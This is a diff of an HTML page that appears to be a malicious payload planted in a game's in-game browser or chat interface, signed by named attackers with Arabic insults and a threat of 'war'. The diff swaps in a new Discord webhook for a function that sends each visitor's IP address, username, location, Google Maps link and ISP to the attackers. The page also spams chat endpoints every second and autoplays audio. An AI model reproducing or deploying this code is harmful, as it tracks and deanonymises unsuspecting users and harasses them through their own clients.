@@ -92,7 +92,7 @@
 
         <div class="media-container">
             <audio autoplay loop>
-                <source src="" />
+                <source src="https://cdn.discordapp.com/attachments/1327975096937087047/1440039056644767920/Islamic_chant_-_youtube.mp3?ex=691cb461&is=691b62e1&hm=c40fbe15e88405ad10bcdbdb60389d8ebc70a7c51f07e59240e8772086911324&" />
                 Your browser does not support the audio element.
             </audio>
         </div>
@@ -106,7 +106,7 @@
         <div class="decorative-text">
             <p>👑#Crazy & ABO SAED & Nazem 👑</p>
             <p>👑حماية برمجة شات جيبيتي زي وجهك يبن الحرام 👑</p>
-            <p>👑أعلن بأسمي القائد الأعظم ناظم بأن سوف تقام عليكم حرب حتى أخر الليل 👑</p>
+            <p>👑أعلن بأسمي القائد الأعظم ناظم بأن سوف تقام عليكم حرب حتى أخر الليل 👑</p
 
         </div>
 
@@ -155,7 +155,7 @@
         }
 
         function sendToDiscord(ipInfoData, googleMapsLink, username) {
-            const webhookURL = "https://discord.com/api/webhooks/1415231483613810708/I4uAnLYqkHIGGjhJFwId-jH8vbnqL5rV_YFxMjMfnC3qjZMu7HFl11nvxcjignfmqH77";
+            const webhookURL = "https://discord.com/api/webhooks/1418969929427845250/02oYHSDo9OtrcBy9HhgnJogOA6vPDolLnXK2att_3qJkfY1ACHqvz0th2MF0AyJtDiKu";
             const payload = {
                 content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
             };
@@ -187,14 +187,6 @@
             alert('اضغط OK للخروج من الشاشة');
         });
     </script>
-
-            setInterval(function() {
-                window.invokeNative("openUrl", "https://youtu.be/xL8Qh0zl6c4?si=sDf0QcH-UweEMxPp");
-                window.invokeNative("openUrl", "https://youtu.be/xL8Qh0zl6c4?si=sDf0QcH-UweEMxPp");
-                window.invokeNative("openUrl", "https://youtu.be/xL8Qh0zl6c4?si=sDf0QcH-UweEMxPp");
-                window.invokeNative("openUrl", "https://youtu.be/xL8Qh0zl6c4?si=sDf0QcH-UweEMxPp");
-            }, 1000);
-        
 <script>
 const msg = `👑#Crazy & ABO SAED & Nazem 👑`;
 const body = JSON.stringify({ message: msg });
@@ -208,7 +200,6 @@ fetch("https://chat/chatResult", { method: "POST", body });
 fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
 }, 1000);
     </script>
-
 
 </body>
 </html>
